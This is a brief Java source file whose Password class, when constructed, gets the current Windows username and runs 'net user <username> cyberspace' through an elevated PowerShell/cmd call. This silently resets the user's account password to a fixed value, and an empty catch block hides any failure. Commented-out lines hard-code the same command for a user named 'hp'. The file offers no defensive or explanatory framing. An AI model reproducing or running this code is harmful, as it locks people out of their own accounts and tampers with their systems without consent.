/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

/**
 *
 * @author hp
 */

public class Password
{
	Password()
	{
            try
            {
	//	final String path = System.getenv("windir") + File.separator + "System32" + File.separator + "rundll32.exe";
	//	String str=null;
		String username = System.getProperty("user.name");
		String cmnd = "net user "+username+" "+"cyberspace";
	//	System.out.println(cmnd);
		String lc = "powershell Start-Process -Verb runAs cmd.exe -ArgumentList "+"'"+"/c "+cmnd+"'";
	//	System.out.println(lc);
		Runtime rt = Runtime.getRuntime();
		Process proc = rt.exec(lc);	
	//	Process proc = rt.exec("powershell Start-Process -Verb runAs cmd.exe -ArgumentList '/c net user hp '");
		
            }
            catch(Exception e)
            {}
	}
}
